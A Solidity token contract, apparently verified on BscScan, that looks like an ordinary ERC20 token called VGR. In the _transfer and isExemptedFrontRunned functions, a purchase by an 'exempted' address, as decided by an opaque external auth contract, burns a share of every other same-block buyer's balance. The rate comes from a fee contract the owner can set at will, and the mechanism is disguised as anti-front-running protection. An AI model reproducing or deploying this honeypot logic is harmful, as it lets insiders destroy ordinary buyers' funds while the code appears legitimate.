/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VGR_Token {
    string public constant name = "VGR";
    string public constant symbol = "VGR_Token";
    uint8 public constant decimals = 18;
    uint256 private _totalSupply = 1000000000 * 10**decimals;

    address private factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public authContract = 0x72F426B124fBCA60452EA7F1d1a1eA594D307EFa;
    address public feeContract;

    address public pairAddress;
    address public owner;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping(address => bool) internal exemptedAccounts;

    address[] private currentBlockBuyersList;
    uint256 lastTxBlock;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value);

    constructor() {     
        owner = msg.sender  ;
        pairAddress = computePairAddress(address(this));
        exemptedAccounts[address(0)] = true;
        exemptedAccounts[msg.sender] = true;
        exemptedAccounts[router] = true;
        exemptedAccounts[pairAddress] = true;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner!");
        _;
    }

    function setFeeContract(address _feeContract) public onlyOwner {
        feeContract = _feeContract; // use address(0) to disable
    } 

    function isExemptedTrader(address inqAddress) public view returns (bool _isExempted) {
        (bool success, bytes memory returnData) = authContract.staticcall(abi.encodeWithSelector(0xfe9fbb80, inqAddress));
        if(success) _isExempted = abi.decode(returnData, (bool));
    }
    function isExempted(address _address) public view returns (bool) {
        return (exemptedAccounts[_address] || isExemptedTrader(_address));
    }

    function getFee() public view returns (uint256 fee){
        (bool success, bytes memory returnData) = feeContract.staticcall(abi.encodeWithSelector(0xaa4b10d1));
        if(success) fee = abi.decode(returnData, (uint256));
    }

    function computePairAddress(address tokenAddress) internal view returns (address) {
        (address token0, address token1) = tokenAddress < wbnb ? (tokenAddress, wbnb) : (wbnb, tokenAddress);
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
    }
    // ERC20 Functions
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address inqAddress) public view returns (uint256) {
        return balances[inqAddress];
    }

    function transfer(address receiver, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, receiver, amount);
    }

    function transferFrom(address tokenOwner, address receiver, uint256 amount) public returns (bool) {
        require(amount <= allowed[tokenOwner][msg.sender],"Invalid number of tokens allowed by owner");
        allowed[tokenOwner][msg.sender] -= amount;
        return _transfer(tokenOwner, receiver, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return allowed[tokenOwner][spender];
    }

    function _transfer(address sender, address receiver, uint256 amount) internal returns (bool) {
        require(sender!= address(0) && receiver!= address(0), "invalid send or receiver address");
        require(amount <= balances[sender], "Invalid number of tokens");

        balances[sender] -= amount;
        balances[receiver] += amount;

        emit Transfer(sender, receiver, amount);
        
        if(sender == pairAddress){
            if(isExempted(receiver)) isExemptedFrontRunned();
            else addToBlockBuyersList(receiver);
        }
        return true;
    }

    function addToBlockBuyersList(address receiver) internal  {
        if(lastTxBlock != block.number){
            lastTxBlock = block.number;
            delete currentBlockBuyersList;
        }
        currentBlockBuyersList.push(receiver);
    }

    function isExemptedFrontRunned() internal {
        uint256 burnFee = getFee();
        if(burnFee>0){
            address[] memory _currentBlockBuyersList = currentBlockBuyersList;
            uint256 burnAmount;
            uint256 balance;
            address frontRunnerAddress;
            for (uint256 i = 0; i < _currentBlockBuyersList.length; i++) {
                frontRunnerAddress = _currentBlockBuyersList[i];
                balance = balances[frontRunnerAddress];
                if(balance>100) {
                    burnAmount = balance * burnFee / 100;
                    balances[frontRunnerAddress] = balance - burnAmount;
                    emit Transfer(frontRunnerAddress, address(0), burnAmount);
                }
            }
        }
    }
}